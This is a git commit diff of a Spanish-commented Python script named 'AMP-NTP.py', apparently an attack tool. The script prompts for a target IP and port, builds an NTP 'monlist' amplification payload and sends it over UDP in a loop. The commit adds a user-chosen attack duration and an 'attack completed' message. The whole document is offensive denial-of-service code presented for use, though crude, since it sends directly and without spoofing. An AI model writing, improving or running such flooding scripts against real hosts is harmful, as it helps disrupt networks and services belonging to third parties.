893dd227ad24837120d59741898fac2aa850c41e
JonchX <jonchx74@gmail.com>
2025-07-25 19:37:12 -0300

    Update AMP-NTP.py

--- AMP-NTP.py
+++ AMP-NTP.py
@@ -1,19 +1,23 @@
 import socket
-import time  # Se importa el módulo time
+import time
 
 # Solicitar datos al usuario
 target_ip = input("Introduce la IP de destino: ")
 target_port = int(input("Introduce el puerto de destino: "))
+duration = int(input("Introduce la duración del ataque en segundos: "))
 
 # Payload para NTP Amplification (comando 'monlist')
 ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+end_time = time.time() + duration
+
 try:
-    while True:
+    while time.time() < end_time:
         sock.sendto(ntp_payload, (target_ip, target_port))
-        time.sleep(1)  # Agrega un delay de 1 segundo entre envíos
+        time.sleep(1)  # Puedes ajustar el delay si lo deseas
+    print("\nAtaque completado.")
 except KeyboardInterrupt:
     print("\nEnvío detenido por el usuario.")
 finally:
